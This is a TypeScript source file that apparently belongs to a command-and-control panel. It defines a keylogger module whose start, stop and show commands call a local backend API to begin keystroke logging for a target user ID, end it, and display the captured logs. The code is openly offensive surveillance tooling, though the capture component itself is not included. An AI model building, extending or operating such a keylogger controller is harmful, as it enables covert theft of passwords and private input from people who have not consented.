import { Command } from "@/Interfaces/Command";
import { Module } from "@/Interfaces/Module";

const start: Command = {
    execute: async (user, args, addOutput) => {
        try {
            addOutput("Starting keylogger for user: " + user.uuid);
            const response = await fetch("http://localhost:8000/api/modules/keylogger/start?id=" + user.uuid, { method: "POST" });
            const data = await response.json();
            addOutput("Keylogger started!");
        } catch (error) {
            console.error("Error starting keylogger:", error);
        }
    },
    help: "Start keylogger for a user. Usage: /keylogger/start"
};

const stop: Command = {
    execute: async (user, args, addOutput) => {
        try {
            addOutput("Stopping keylogger for user: " + user.uuid);
            const response = await fetch("http://localhost:8000/api/modules/keylogger/stop?id=" + user.uuid, { method: "POST" });
            const data = await response.json();
            addOutput("Keylogger stopped!");
        } catch (error) {
            console.error("Error stopping keylogger:", error);
        }
    },
    help: "Stop keylogger for a user. Usage: /keylogger/stop"
};

const show: Command = {
    execute: async (user, args, addOutput) => {
        try {
            addOutput("Fetching keylogger logs for user: " + user.uuid);
            const response = await fetch("http://localhost:8000/api/modules/keylogger/logs?id=" + user.uuid);
            const data = await response.json();
            addOutput(data.logs);
        } catch (error) {
            console.error("Error fetching keylogger logs:", error);
        }
    },
    help: "Show keylogger logs for a user. Usage: /keylogger/logs"
};

export const keyloggerModule: Module = {
    commands: {
        start,
        stop,
        show
    },
    help: "Module for keylogging"
};